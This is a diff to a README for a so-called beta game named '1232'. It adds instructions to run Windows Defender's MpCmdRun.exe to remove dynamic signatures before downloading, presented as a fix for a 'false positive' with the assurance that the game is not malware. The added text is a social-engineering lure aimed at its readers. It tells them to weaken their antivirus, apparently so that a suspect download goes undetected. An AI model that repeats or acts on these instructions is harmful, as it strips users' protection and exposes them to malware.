@@ -1,3 +1,8 @@
 # 1232
-note that this is in beta stage and note it has little reputation so your antivirus might think its a virus
-because its new and in development this is safe and a fun game.
+run this command in command prompt before downloading
+this resolves the false positive for windows defender
+this is not malware but its a fun game
+
+cd %ProgramFiles%\Windows Defender
+MpCmdRun.exe -removedefinitions -dynamicsignatures
+MpCmdRun.exe -SignatureUpdate
